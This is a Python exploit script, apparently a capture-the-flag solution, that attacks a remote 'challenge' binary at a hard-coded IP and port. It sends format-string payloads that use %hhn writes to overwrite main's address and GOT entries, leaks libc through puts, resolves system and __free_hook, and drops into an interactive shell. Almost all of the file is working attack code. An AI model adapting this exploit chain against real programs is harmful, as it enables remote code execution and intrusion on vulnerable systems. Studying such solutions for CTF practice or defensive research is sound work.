#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe = context.binary = ELF("./challenge")
host = args.HOST or "128.199.210.141"
port = int(args.PORT or 5003)

gdbscript = """
tbreak main
b *main+431
# b *main+395
continue
""".format(
    **locals()
)

libc = SetupLibcELF()
io = start()
re()
sl(b"k")
target = 0x40403B
success(f"MAIN := {hex(exe.sym.main)}")
success(f"MAIN := {hex(get_nth_byte(exe.sym.main, 0))}")
success(f"MAIN := {hex(get_nth_byte(exe.sym.main, 1))}")
success(f"MAIN := {hex(get_nth_byte(exe.sym.main, 2))}")
success(f"MAIN := {hex(get_nth_byte(exe.sym.main, 3))}")
payload = f""
payload += f"%{get_nth_byte(exe.sym.main, 0)-14}c%8$hhn"
payload += f"%{get_nth_byte(exe.sym.main, 1)+73+0x11}c%9$hhn"
payload += f"%{get_nth_byte(exe.sym.main, 2)+175+0x40}c%10$hhn"
payload += f"%{99}c%38$n"
payload += f"%{21}$p"
print(len(payload))
sla(b"name: ", payload)
re()
sl(b"8")

sl(str(target))
sl(b"0")

sl(str(target + 1))
sl(b"0")

sl(str(target + 2))
sl(b"0")

sl(str(exe.got.puts))
sl(b"0")

libc.address = GetInt(re())[0] - libc.sym["__libc_start_main"] + 240
lb()


sl(b"k")

payload = f""
payload += f"%{get_nth_byte(libc.sym.system, 0)}c%8$hhn"
payload += f"%{get_nth_byte(libc.sym.system, 1)}c%9$hhn"
payload += f"%{get_nth_byte(libc.sym.system, 2)}c%10$hhn"
payload += f"%{get_nth_byte(libc.sym.system, 3)}c%10$hhn"
# payload += f"%{get_nth_byte(libc.sym.system, 4)}c%10$hhn"

target = target + 8
print(len(payload))
success(f"MAIN := {hex(libc.sym.system)}")
success(f"MAIN := {hex(get_nth_byte(libc.sym.system, 0))}")
success(f"MAIN := {hex(get_nth_byte(libc.sym.system, 1))}")
success(f"MAIN := {hex(get_nth_byte(libc.sym.system, 2))}")
success(f"MAIN := {hex(get_nth_byte(libc.sym.system, 3))}")
success(f"MAIN := {hex(get_nth_byte(libc.sym.system, 4))}")

t1 = (libc.sym.__free_hook & 0xFFFFFF000000) >> 24
t2 = libc.sym.__free_hook & 0x000000FFFFFF
success(f"MAIN := {hex(libc.sym.__free_hook)}")
success(f"MAIN := {hex(t1)}")
success(f"MAIN := {hex(t2)}")
sla(b"name: ", b"AAAA")
re()
sl(b"2")
sl(str(t2))
sl(str(t1))
io.interactive()
